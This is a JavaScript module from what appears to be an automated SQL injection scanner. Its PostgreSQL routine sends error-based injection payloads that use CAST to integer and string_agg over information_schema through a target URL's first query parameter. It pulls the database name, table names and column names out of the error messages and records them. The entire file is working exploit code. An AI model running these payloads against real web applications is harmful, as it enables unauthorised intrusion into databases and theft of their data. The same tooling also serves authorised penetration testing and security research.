import { printInfo, printSuccess } from "./logger.js";
import { sendRequest } from "./http.js";
import { mutateQuery } from "./helper.js";
import { dbSaveColName, dbSaveDbName, dbSaveTblName, dbSaveVulnerability } from "./database.js";

export async function testPostgresql(setting) {
	printInfo("Running POSTGRESQL test suite");

	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	const dbNameId = await getDatabaseName(setting, query, firstParamsName, firstParamsValue, c);
	const tblList = await getTblName(setting, query, firstParamsName, firstParamsValue, c, dbNameId);
	getColumnName(setting, query, firstParamsName, firstParamsValue, c, tblList);
}

async function getDatabaseName(setting, query, name, valueBase, c) {
	const injection = " AND 1=CAST(current_database() AS int)-- 42";
	const payload = `${valueBase}${c}${injection}`;
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);
	const nameList = parseBody(res.body);
	printSuccess(`Database name: ${nameList}`);

	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const dbNameId = dbSaveDbName(setting.db, setting.scanId, nameList[0]);

	return dbNameId;
}

async function getTblName(setting, query, name, valueBase, c, dbNameId) {
	const injection = " AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)-- 42";
	const payload = `${valueBase}${c}${injection}`;
	const params = mutateQuery(query, name, payload);
	const res = await sendRequest(setting, params);
	const tblNames = parseBody(res.body);
	printSuccess(`Database tables: ${tblNames}`);
	
	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const tblList = [];
	for (const tblName of tblNames) {
		const tblNameId = dbSaveTblName(setting.db, dbNameId, tblName);
		tblList.push({tblNameId, tblName});
	}

	return tblList;
}

async function getColumnName(setting, query, name, valueBase, c, tblList) {
	for (const table of tblList) {
		const injection = ` AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='${table.tblName}') AS int)-- 42`;
		const payload = `${valueBase}${c}${injection}`;
		const params = mutateQuery(query, name, payload);
		const res = await sendRequest(setting, params);
		const colNames = parseBody(res.body);
		printSuccess(`Table ${table.tblName} columns: ${colNames}`);

		dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
		for (const colName of colNames) {
			dbSaveColName(setting.db, table.tblNameId, colName);
		}
	}
}

function parseBody(body) {
	const match = body.match(/type integer: \\?"(.*?)\\?"/);
    return match ? match[1].split(',') : [];
}
